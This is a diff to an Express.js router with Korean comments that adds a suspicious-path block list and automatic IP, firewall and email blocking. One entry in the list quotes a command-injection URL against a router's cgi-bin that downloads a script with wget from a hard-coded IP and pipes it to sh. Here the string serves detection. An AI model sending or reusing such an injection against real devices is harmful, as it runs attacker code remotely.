@@ -6,8 +6,8 @@ const jwt = require('jsonwebtoken');
 const router = express.Router();
 
 const BLOCK_TIME = 3600 * 1000; // 1시간 (밀리초)
-const MAX_REQUESTS_PER_MINUTE = 110; // 1분당 최대 요청 허용 수
-const REQUEST_WINDOW = 60000; // 1분 (밀리초)
+const MAX_REQUESTS_PER_MINUTE = 200; // 1분당 최대 요청 허용 수
+const REQUEST_WINDOW = 10000; // 1분 (밀리초)
 const SECRET_KEY = process.env.SECRET_KEY || 'your_secret_key'; // 비밀 키
 const requestCounts = new Map(); // IP별 요청 기록
 
@@ -126,12 +126,29 @@ const unblockIpInDb = async (ip) => {
 
 // 특정 확장자 접근 차단 미들웨어 추가
 router.use((req, res, next) => {
-    const forbiddenExtensions = ['.php', '.js'];
-    const requestPath = req.path.toLowerCase();
+    // 의심스러운 경로 리스트
+    const suspiciousPaths = [
+        '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60)',
+        '/.env',
+        '/login.rsp',
+        '/admin',
+        '/config.php',
+        '.php',
+        'index.php'
+    ];
+    const ip = getClientIp(req);        
 
-    if (forbiddenExtensions.some((ext) => requestPath.endsWith(ext))) {
-        console.log('\x1b[31m%s\x1b[0m', `차단된 확장자 요청: ${requestPath}`); // 빨간색 로그
-        return res.status(403).send('접근이 차단되었습니다.');
+    // 경로가 의심스러운 경우 차단
+    if (suspiciousPaths.includes(req.path.toLowerCase())) {
+        console.log('\x1b[31m%s\x1b[0m', `의심스러운 경로 요청 감지: ${req.path}, IP: ${ip}`); // 빨간색 로그
+
+        const unblockTime = Date.now() + BLOCK_TIME; // 차단 해제 시간
+        blockIpInDb(ip, unblockTime, '의심스러운 경로 접근'); // DB에 차단 기록 추가
+        addBlockedIpToHistory(ip, unblockTime, '의심스러운 경로 접근'); // 히스토리 테이블에 추가
+        blockIpOnFirewall(ip); // 방화벽 차단 실행
+        sendEmail(ip, unblockTime); // 관리자에게 알림 이메일 전송
+
+        return res.status(403).send('의심스러운 접근으로 차단되었습니다.');
     }
 
     next();
